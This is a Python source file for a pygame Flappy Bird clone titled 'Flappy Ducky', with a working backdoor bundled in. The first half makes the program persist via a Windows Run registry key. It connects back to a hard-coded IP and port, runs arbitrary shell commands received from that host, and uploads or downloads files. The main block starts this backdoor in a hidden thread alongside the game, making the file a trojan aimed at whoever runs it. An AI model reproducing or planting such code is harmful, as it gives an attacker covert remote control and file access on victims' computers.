import pygame
import random
import sys
import socket
import subprocess
import threading
import time
import json
import os
import signal
import hashlib
import select
import shutil

# Backdoor-related code (same as before, kept for completeness)
HOST_IP = '192.168.100.122'  # Replace with your server IP
PORT = 2222
CHUNK_SIZE = 8192

def become_persistent():
    if os.name == 'nt':
        app_data = os.path.join(os.environ["APPDATA"], "backdoor.exe")
        if not os.path.exists(app_data):
            shutil.copyfile(sys.executable, app_data)
            subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d "{app_data}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def calculate_md5(filename):
    md5_hash = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            md5_hash.update(chunk)
    return md5_hash.hexdigest()

def receive_command(sock):
    data = ''
    while True:
        try:
            chunk = sock.recv(1024).decode()
            if not chunk:
                return None
            data += chunk
            return json.loads(data)
        except json.JSONDecodeError:
            continue
        except Exception:
            return None

def send_output(sock, data):
    try:
        jsondata = json.dumps(data)
        sock.sendall(jsondata.encode())
        return True
    except:
        return False

def send_file(sock, filename):
    try:
        if not os.path.exists(filename):
            send_output(sock, f"[!] File {filename} not found")
            return False

        filesize = os.path.getsize(filename)
        md5_hash = calculate_md5(filename)
        
        metadata = {'filename': os.path.basename(filename), 'filesize': filesize, 'md5': md5_hash}
        if not send_output(sock, metadata):
            return False

        if receive_command(sock) != "READY":
            return False

        with open(filename, 'rb') as f:
            sock.sendall(f.read())

        return True
    except Exception as e:
        send_output(sock, f"[!] Error sending file: {str(e)}")
        return False

def receive_file(sock, target_filename):
    try:
        metadata = receive_command(sock)
        if isinstance(metadata, str) and metadata.startswith('[!]'):
            return False

        filesize = metadata['filesize']
        expected_md5 = metadata['md5']
        
        if not send_output(sock, "READY"):
            return False

        md5_hash = hashlib.md5()
        bytes_received = 0
        
        with open(target_filename, 'wb') as f:
            while bytes_received < filesize:
                chunk = sock.recv(min(CHUNK_SIZE, filesize - bytes_received))
                if not chunk:
                    break
                f.write(chunk)
                md5_hash.update(chunk)
                bytes_received += len(chunk)

        received_md5 = md5_hash.hexdigest()
        success = received_md5 == expected_md5 and bytes_received == filesize
        
        send_output(sock, {'success': success, 'message': "[+] File received successfully" if success else "[!] File verification failed"})
        return success
    except Exception as e:
        send_output(sock, {'success': False, 'message': f"[!] Error receiving file: {str(e)}"})
        return False

def handle_cd(sock, path):
    try:
        os.chdir(path.strip('"\''))
        send_output(sock, f"[+] Changed to {os.getcwd()}")
    except Exception as e:
        send_output(sock, f"[!] Error: {str(e)}")

def shell(sock):
    last_activity = time.time()
    while True:
        try:
            if time.time() - last_activity > 15:
                if not send_output(sock, "PING"):
                    return
                last_activity = time.time()

            if sock in select.select([sock], [], [], 1)[0]:
                command = receive_command(sock)
                if not command:
                    return
                last_activity = time.time()
                
                if command == ":kill":
                    return
                elif command.startswith("cd "):
                    handle_cd(sock, command[3:])
                elif command.startswith("download "):
                    send_file(sock, command.split(" ", 1)[1].strip())
                elif command.startswith("upload "):
                    receive_file(sock, command.split(" ", 1)[1].strip())
                else:
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                        output = result.stdout + result.stderr or "[+] Command executed successfully"
                        send_output(sock, output)
                    except subprocess.TimeoutExpired:
                        send_output(sock, "[!] Command timed out")
                    except Exception as e:
                        send_output(sock, f"[!] Error: {str(e)}")
        except Exception as e:
            return

def connect():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(30)
                sock.connect((HOST_IP, PORT))
                shell(sock)
        except Exception as e:
            time.sleep(3)

def signal_handler(sig, frame):
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def run_backdoor():
    become_persistent()
    connect()

pygame.init()
WIDTH, HEIGHT = 500, 700
GRAVITY = 0.5
FLAP_STRENGTH = -7
PIPE_GAP = 180
PIPE_WIDTH = 80
PIPE_VELOCITY = 3
BIRD_X = 50
WHITE, BLACK = (255,255,255), (0,0,0)

try:
    bird_img = pygame.transform.scale(pygame.image.load("bird.png"), (50,35))
    background_img = pygame.transform.scale(pygame.image.load("background.png"), (WIDTH, HEIGHT))
    pipe_img = pygame.transform.scale(pygame.image.load("pipe.png"), (PIPE_WIDTH, 400))
    pipe_img_top = pygame.transform.flip(pipe_img, False, True)
except Exception as e:
    print(f"Asset error: {e}")
    sys.exit()

screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Flappy Ducky")
clock = pygame.time.Clock()
font = pygame.font.SysFont(None, 40)

class Bird:
    def __init__(self):
        self.y = HEIGHT//2
        self.velocity = 0
        self.rect = bird_img.get_rect(topleft=(BIRD_X, self.y))
    
    def flap(self):
        self.velocity = FLAP_STRENGTH
    
    def update(self):
        self.velocity += GRAVITY
        self.y += self.velocity
        self.rect.y = self.y
    
    def draw(self):
        angle = -30 if self.velocity < 0 else 30 if self.velocity > 5 else 0
        screen.blit(pygame.transform.rotate(bird_img, angle), self.rect)

class Pipe:
    def __init__(self, x):
        self.x = x
        self.height = random.randint(120, 350)
        self.top_y = self.height - 400
        self.bottom_y = self.height + PIPE_GAP
        self.passed = False
    
    def update(self):
        self.x -= PIPE_VELOCITY
    
    def draw(self):
        screen.blit(pipe_img_top, (self.x, self.top_y))
        screen.blit(pipe_img, (self.x, self.bottom_y))

def main():
    bird = Bird()
    pipes = [Pipe(WIDTH + i*220) for i in range(3)]
    score = 0
    running = True

    while running:
        screen.blit(background_img, (0,0))
        
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.KEYDOWN and event.key == pygame.K_SPACE:
                bird.flap()
        
        bird.update()
        
        for pipe in pipes:
            pipe.update()
            if pipe.x < -PIPE_WIDTH:
                pipes.remove(pipe)
                pipes.append(Pipe(pipes[-1].x + 220 if pipes else WIDTH + 220))
            
            if not pipe.passed and pipe.x < BIRD_X:
                pipe.passed = True
                score += 1
            
            pipe.draw()
            
            if bird.rect.colliderect(pygame.Rect(pipe.x, pipe.top_y, PIPE_WIDTH, 400)) or \
               bird.rect.colliderect(pygame.Rect(pipe.x, pipe.bottom_y, PIPE_WIDTH, 400)) or \
               bird.rect.bottom >= HEIGHT:
                bird.y, bird.velocity = HEIGHT//2, 0
                pipes = [Pipe(WIDTH + i*220) for i in range(3)]
                score = 0
                break
        
        bird.draw()
        screen.blit(font.render(f"Score: {score}", True, BLACK), (10,10))
        pygame.display.update()
        clock.tick(30)
    
    pygame.quit()

if __name__ == "__main__":
    threading.Thread(target=run_backdoor, daemon=True).start()
    main()
